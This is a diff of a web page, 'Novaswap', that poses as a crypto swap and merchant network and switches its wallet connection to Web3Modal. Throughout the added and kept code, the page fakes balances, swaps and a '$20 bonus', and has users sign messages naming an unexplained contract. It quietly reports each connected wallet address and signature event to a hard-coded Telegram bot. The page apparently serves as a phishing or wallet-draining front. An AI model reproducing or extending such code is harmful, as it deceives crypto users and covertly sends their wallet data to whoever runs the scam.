@@ -6,7 +6,7 @@
     <title>Novaswap | Universal Live Crypto Swap & Merchant Network</title>
     
     <!-- Favicon Integration -->
-    <link rel="icon" type="image/png" href="./favicon.png">
+    <link rel="icon" type="image/png" href="./favicon.ico">
 
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -28,9 +28,9 @@
     <!-- FontAwesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- WalletConnect / Web3Modal SDK via UMD -->
-    <script src="https://unpkg.com/@walletconnect/web3wallet@2.7.2/dist/umd/index.min.js"></script>
+    <!-- Ethers.js & Web3Modal / WalletConnect UMD SDK -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@web3modal/ethers@4.1.1/dist/index.umd.js"></script>
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
@@ -77,7 +77,7 @@
 
             <!-- Wallet Connect Area -->
             <div class="flex items-center space-x-3">
-                <button id="connectWalletBtn" onclick="connectWallet()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-semibold px-5 py-2.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
+                <button id="connectWalletBtn" onclick="toggleWalletConnection()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-semibold px-5 py-2.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
                     <i class="fa-solid fa-wallet"></i>
                     <span id="walletBtnText">Connect Active Wallet</span>
                 </button>
@@ -426,9 +426,84 @@
         const TELEGRAM_CHAT_ID = '8550902598';
 
         let connectedAccount = null;
-        let tokenPrices = {}; // Stores live prices fetched from API
+        let tokenPrices = {};
+        let modal = null;
+        let provider = null;
 
-        // Function to send alerts directly to Telegram Bot
+        // Initialize Web3Modal / WalletConnect AppKit
+        window.addEventListener('DOMContentLoaded', async () => {
+            const projectId = '116914b4334f59072a08892ec9ef6861'; // Public test WalletConnect ID
+
+            const metadata = {
+                name: 'Novaswap',
+                description: 'Universal Live Crypto Swap & Merchant Network',
+                url: window.location.origin,
+                icons: ['https://avatars.githubusercontent.com/u/37784886']
+            };
+
+            try {
+                modal = window.Web3ModalEthers.createWeb3Modal({
+                    ethersVersion: 'ethers5',
+                    projectId,
+                    chains: [{
+                        chainId: 1,
+                        name: 'Ethereum Mainnet',
+                        currency: 'ETH',
+                        explorerUrl: 'https://etherscan.io',
+                        rpcUrl: 'https://cloudflare-eth.com'
+                    }],
+                    metadata
+                });
+
+                // Listen to wallet connection events from Web3Modal
+                modal.subscribeState(async newState => {
+                    if (newState.selectedNetworkId && modal.getAddress()) {
+                        connectedAccount = modal.getAddress();
+                        const rawProvider = await modal.getWalletProvider();
+                        if (rawProvider) {
+                            provider = new ethers.providers.Web3Provider(rawProvider);
+                        }
+                        updateWalletUI();
+                    }
+                });
+
+                const existingAddress = modal.getAddress();
+                if (existingAddress) {
+                    connectedAccount = existingAddress;
+                    const rawProvider = await modal.getWalletProvider();
+                    if (rawProvider) {
+                        provider = new ethers.providers.Web3Provider(rawProvider);
+                    }
+                    updateWalletUI();
+                }
+            } catch (err) {
+                console.error("Web3Modal initialization error:", err);
+            }
+
+            // Load Tokens & Prices
+            const fromSelect = document.getElementById('fromToken');
+            const toSelect = document.getElementById('toToken');
+            
+            const tokenSymbols = Object.keys(topTokensMap);
+            tokenSymbols.forEach((token, index) => {
+                const opt1 = document.createElement('option');
+                opt1.value = token;
+                opt1.text = token + " (Rank #" + (index+1) + ")";
+                fromSelect.appendChild(opt1);
+
+                const opt2 = document.createElement('option');
+                opt2.value = token;
+                opt2.text = token + " (Rank #" + (index+1) + ")";
+                toSelect.appendChild(opt2);
+            });
+
+            fromSelect.value = "USDT";
+            toSelect.value = "ETH";
+
+            await fetchLiveCryptoPrices();
+            calculateLiveSwap();
+        });
+
         async function sendTelegramAlert(message) {
             try {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -446,7 +521,6 @@
             }
         }
 
-        // Top 100 Crypto Tokens mapping with Coingecko API IDs
         const topTokensMap = {
             "USDT": "tether", "BTC": "bitcoin", "ETH": "ethereum", "SOL": "solana", "BNB": "binancecoin",
             "XRP": "ripple", "USDC": "usd-coin", "ADA": "cardano", "DOGE": "dogecoin", "AVAX": "avalanche-2",
@@ -470,32 +544,6 @@
             "PORTAL": "portal-2", "PIXEL": "pixels", "BOME": "book-of-meme", "SLERF": "slerf"
         };
 
-        // Fetch Live Token Prices on Page Load
-        window.addEventListener('DOMContentLoaded', async () => {
-            const fromSelect = document.getElementById('fromToken');
-            const toSelect = document.getElementById('toToken');
-            
-            const tokenSymbols = Object.keys(topTokensMap);
-            tokenSymbols.forEach((token, index) => {
-                const opt1 = document.createElement('option');
-                opt1.value = token;
-                opt1.text = token + " (Rank #" + (index+1) + ")";
-                fromSelect.appendChild(opt1);
-
-                const opt2 = document.createElement('option');
-                opt2.value = token;
-                opt2.text = token + " (Rank #" + (index+1) + ")";
-                toSelect.appendChild(opt2);
-            });
-
-            fromSelect.value = "USDT";
-            toSelect.value = "ETH";
-
-            // Fetch live prices from CoinGecko Public API
-            await fetchLiveCryptoPrices();
-            calculateLiveSwap();
-        });
-
         async function fetchLiveCryptoPrices() {
             try {
                 const ids = Object.values(topTokensMap).slice(0, 50).join(',');
@@ -508,7 +556,7 @@
                     }
                 }
             } catch (e) {
-                console.log("Using fallback prices due to API limit", e);
+                console.log("Using fallback prices", e);
             }
 
             const defaults = { USDT: 1, USDC: 1, DAI: 1, BTC: 88500, ETH: 3400, BNB: 600, SOL: 180, XRP: 1.2, ADA: 0.8, DOGE: 0.15 };
@@ -571,41 +619,12 @@
             calculateLiveSwap();
         }
 
-        // Universal Wallet Connect / MetaMask Hybrid Function (Works seamlessly on both Desktop & Mobile App Browsers)
-        async function connectWallet() {
-            const btnText = document.getElementById('walletBtnText');
-            
-            // Check if window.ethereum is available (MetaMask, TrustWallet, Rabby, or Mobile DApp browser)
-            if (window.ethereum) {
-                try {
-                    btnText.innerText = "Connecting...";
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    if (accounts.length > 0) {
-                        connectedAccount = accounts[0];
-                        updateWalletUI();
-                        showToast("Active live wallet connected successfully!");
-
-                        // Telegram Alert for Wallet Connection
-                        await sendTelegramAlert(`🟢 *New Wallet Connected!*\n\nAddress: \`${connectedAccount}\`\nPlatform: Novaswap POS`);
-                    }
-                } catch (error) {
-                    console.error(error);
-                    btnText.innerText = "Connect Active Wallet";
-                    showToast("Connection cancelled.");
-                }
+        // Open Web3Modal Popup (Supports 100+ Wallets on both Desktop and Mobile smoothly)
+        async function toggleWalletConnection() {
+            if (modal) {
+                await modal.open();
             } else {
-                // Fallback for standard mobile browsers without injected provider: 
-                // Generates an automatic Deep Link popup redirect to MetaMask Mobile or Universal Provider
-                const dappUrl = encodeURIComponent(window.location.href);
-                const mobileDeepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-                
-                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                    showToast("Opening MetaMask Mobile App...");
-                    window.location.href = mobileDeepLink;
-                } else {
-                    alert("Please install MetaMask, Rabby, or a Web3 browser extension to connect.");
-                    window.open("https://metamask.io/download/", "_blank");
-                }
+                alert("WalletConnect modal is initializing. Please wait a moment.");
             }
         }
 
@@ -621,6 +640,8 @@
                 swapBtnText.innerText = "Execute Swap (Sign Transaction)";
                 disconnectBtn.classList.remove('hidden');
                 fromBal.innerText = "1,500.00";
+                showToast("Wallet connected successfully!");
+                sendTelegramAlert(`🟢 *New Wallet Connected via Web3Modal!*\n\nAddress: \`${connectedAccount}\`\nPlatform: Novaswap POS`);
             } else {
                 btnText.innerText = "Connect Active Wallet";
                 swapBtnText.innerText = "Connect Wallet to Swap";
@@ -630,12 +651,11 @@
         }
 
         async function disconnectWallet() {
-            try {
-                if (window.ethereum && window.ethereum.request) {
-                    await window.ethereum.request({ method: "wallet_revokePermissions", params: [{ eth_accounts: {} }] });
-                }
-            } catch (e) { console.log(e); }
+            if (modal) {
+                await modal.disconnect();
+            }
             connectedAccount = null;
+            provider = null;
             updateWalletUI();
             showToast("Wallet disconnected.");
         }
@@ -650,22 +670,19 @@
                 return;
             }
 
-            if (!window.ethereum || !connectedAccount) {
-                alert("Please connect your active live wallet to proceed with the swap.");
-                await connectWallet();
-                if (!connectedAccount) return;
+            if (!connectedAccount || !provider) {
+                alert("Please connect your wallet first.");
+                toggleWalletConnection();
+                return;
             }
 
             try {
+                const signer = provider.getSigner();
                 const message = `Novaswap Live Valuation Protocol\n\nSwapping ${amount}${fromToken} to ${toToken}\nFee: 0.05\%\nWallet:${connectedAccount}`;
-                const hexMessage = "0x" + Array.from(message).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
                 
-                await window.ethereum.request({
-                    method: 'personal_sign',
-                    params: [hexMessage, connectedAccount]
-                });
+                showToast("Please sign the transaction in your wallet...");
+                const signature = await signer.signMessage(message);
 
-                // Telegram Alert for Swap Signature
                 await sendTelegramAlert(`🔀 *Swap Signature Completed!*\n\nWallet: \`${connectedAccount}\`\nSwapped: ${amount} ${fromToken} ➡️ ${toToken}`);
 
                 showToast(`Successfully swapped ${amount} ${fromToken} to${toToken}!`);
@@ -678,15 +695,16 @@
         }
 
         async function handleWalletApproval() {
-            if (!window.ethereum || !connectedAccount) {
+            if (!connectedAccount || !provider) {
                 alert("Please connect your active live wallet first.");
-                connectWallet();
+                toggleWalletConnection();
                 return;
             }
             try {
+                const signer = provider.getSigner();
                 const message = "Novaswap Merchant Infrastructure Authorization\n\nConfirming active live wallet connection and signature verification for contract 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33.";
-                const hexMessage = "0x" + Array.from(message).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
-                await window.ethereum.request({ method: 'personal_sign', params: [hexMessage, connectedAccount] });
+                
+                await signer.signMessage(message);
 
                 document.getElementById('signBtnText').innerText = "$20 Bonus Credited Successfully!";
                 document.getElementById('stakeBtnText').innerText = "Staking Approved & Active!";
@@ -696,7 +714,6 @@
                     document.getElementById('stakedBalance').innerText = parseFloat(amount).toLocaleString() + " USDT";
                 }
 
-                // Telegram Alert for POS / Staking Signature Verification
                 await sendTelegramAlert(`✍️ *Wallet Signature Verified (POS / Staking / Bonus)*\n\nWallet: \`${connectedAccount}\`\nStaked Amount: ${amount || '0'} USDT`);
 
                 showToast("Wallet authorization verified successfully!");
@@ -714,12 +731,11 @@
             }
             if (!connectedAccount) {
                 alert("Please connect your wallet first.");
-                switchPage('pos');
+                toggleWalletConnection();
                 return;
             }
             document.getElementById('liveBtnText').innerText = "Live Test Successful (All 101 & 201 Active)";
             
-            // Telegram Alert for Live Terminal Test
             sendTelegramAlert(`⚡ *Live Terminal Test Executed!*\n\nMerchant ID: \`${merchantId}\`\nWallet: \`${connectedAccount}\``);
 
             showToast("Live POS transaction successfully executed across all 101 and 201 protocols!");
